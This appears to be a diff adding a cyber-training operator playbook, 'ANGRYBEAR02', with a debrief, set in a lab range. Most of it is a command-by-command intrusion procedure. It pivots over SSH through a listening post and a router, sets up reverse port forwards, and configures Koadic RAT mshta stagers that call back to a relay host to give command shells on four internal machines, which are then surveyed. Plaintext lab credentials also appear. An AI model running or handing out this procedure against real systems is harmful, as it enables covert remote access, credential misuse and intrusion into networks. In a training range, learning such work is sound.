@@ -1,0 +1,181 @@
+*** # = your student number ***
+T2 RHP = #229 – Endpoint = may
+T3 RHP = #228 – Endpoint = theforce
+T4 RHP = #227 – Endpoint = bewith
+T5 RHP = #226 – Endpoint = you
+
+
+ANGRYBEAR02
+2022-08-19
+Start Time: 0900
+Duration: 6 hours
+IPs:
+LP: 10.50.40.222
+-------------------------------
+->T1: 10.50.28.166
+--<T2: 10.180.169.17
+--<T3: 10.180.169.16
+--<T4: 10.180.169.9
+--<T5: 10.180.169.20
+
+Credentials: student#::password# // NOC_admin#::7XBPRzyKsUWBeI3puA
+
+
+LP
+Hostname: koa-lp
+IP:  10.50.40.222
+OS: CentOS7
+Creds: student#::password#
+Last Known SSH Port: 22
+<on kali>
+ssh -MS /tmp/LP -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student4@10.50.40.222 -p 22
+password4
+<another window>
+ssh -S /tmp/LP bad
+<vetting>
+
+Action: Perform SSH masquerade. Redirect to T1. After accessing and vetting T1 and preparing tunnels, you will configure Koadic stagers one at a time.
+
+The Koadic RAT is located in the system root directory (You must “cd” to this directory for Koadic to run properly) and requires sudo to function correctly. Configure Koadic stager variables as directed. Notify Analyst once a stager is complete to initiate callback.
+
+
+sudo cd /koadic
+
+T1
+Hostname: koa-ext-rtr
+IP: 10.50.28.166
+OS: Linux v. Unknown
+Creds: NOC_admin#::7XBPRzyKsUWBeI3puA
+Last Known SSH Port: 22
+<on LP>
+ssh -MS /tmp/T1.4 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null NOC_admin4@10.50.28.166 -p 22
+7XBPRzyKsUWBeI3puA
+<verify new LP internal IP address with MC>
+<vetting>
+<notify MC of disconnect>
+
+
+ssh -M -S /tmp/T1.koa.ext.rtr NOC_admin23@10.50.28.166 -R 10.180.169.253:23229:0.0.0.0:23229
+
+
+T2
+Hostname: Unknown
+IP: 10.180.169.17
+<On LP>
+ssh -S /tmp/T1.4 bad -O forward -R 10.180.169.253:4229:localhost:4229
+sudo ./koadic
+Stager: stager/js/mshta
+info
+set SRVHOST 10.180.169.253
+set SRVPORT 4229
+set ENDPOINT may
+info
+run
+<give the command to EA>
+zombies
+cmdshell 0
+On T2
+<notify MC of connect, send EA IP>
+<vett or survey the box>
+cat ~/Documents/ANGRYBEAR01/survey_paste >> Survey_10.180.169.17
+<notify EA of survey complete>
+<on LP>
+listeners
+listener -k 0
+zombies
+ssh -S /tmp/T1.4 bad -O cancel -R 10.180.169.253:4229:localhost:4229
+<notify MC disconnect>
+
+T3
+Hostname: Unknown
+IP: 10.180.169.16
+ssh -S /tmp/T1.4 bad -O forward -R 10.180.169.253:4228:localhost:4228
+sudo ./koadic
+Stager: stager/js/mshta
+info
+set SRVHOST 10.180.169.253
+set SRVPORT 4228
+set ENDPOINT theforce
+info
+run
+<give the command to EA>
+zombies
+cmdshell 0
+On T3
+<notify MC of connect, send EA IP>
+<vett or survey the box>
+cat ~/Documents/ANGRYBEAR01/survey_paste >> Survey_10.180.169.16
+<notify EA of survey complete>
+<on LP>
+listeners
+listener -k 0
+zombies
+ssh -S /tmp/T1.4 bad -O cancel -R 10.180.169.253:4228:localhost:4228
+<notify MC disconnect>
+
+T4
+Hostname: Unknown
+IP: 10.180.169.9
+ssh -S /tmp/T1.4 bad -O forward -R 10.180.169.253:4227:localhost:4227
+sudo ./koadic
+Stager: stager/js/mshta
+info
+set SRVHOST 10.180.169.253
+set SRVPORT 4227
+set ENDPOINT bewith
+info
+run
+<give the command to EA>
+zombies
+cmdshell 0
+On T4
+<notify MC of connect, send EA IP>
+<vett or survey the box>
+cat ~/Documents/ANGRYBEAR01/survey_paste >> Survey_10.180.169.9
+<notify EA of survey complete>
+<on LP>
+listeners
+listener -k 0
+zombies
+ssh -S /tmp/T1.4 bad -O cancel -R 10.180.169.253:4227:localhost:4227
+<notify MC disconnect>
+
+T5
+Hostname: Unknown
+IP: 10.180.169.20
+ssh -S /tmp/T1.4 bad -O forward -R 10.180.169.253:4226:localhost:4226
+sudo ./koadic
+Stager: stager/js/mshta
+info
+set SRVHOST 10.180.169.253
+set SRVPORT 4226
+set ENDPOINT you
+info
+run
+<give the command to EA>
+zombies
+cmdshell 0
+On T5
+<notify MC of connect, send EA IP>
+<vett or survey the box>
+cat ~/Documents/ANGRYBEAR01/survey_paste >> Survey_10.180.169.50
+<notify EA of survey complete>
+<on LP>
+listeners
+listener -k 0
+zombies
+ssh -S /tmp/T1.4 bad -O cancel -R 10.180.169.253:4226:localhost:4226
+<notify MC disconnect>
+
+
+DEBRIEF 
+
+Operator: 1LT An
+Operation: ANGRYBEAR02
+
+MC: mc2
+
+Analyst: analyst2
+
+Description: ANGRYBEAR is a C-ISR mission profile. We got on to LP to utilize the koadic Windows Post-Exploitation tool. We first redirected to T1, the external router, to prepare for the exploit. We utilize the koadic implant and stager to get cmdshell on the devices in the internal network. On T2, we got a shell via koadic, and conducted a survey. On T3, we got a shell via koadic, and conducted a survey. On T4, we got a shell via koadic, and conducted a survey. On T5, we got a shell via koadic, and conducted a survey. 
+Overall, this mission was successful. We were able to survey all the devices for future ops. The koadic implant worked without any problem.
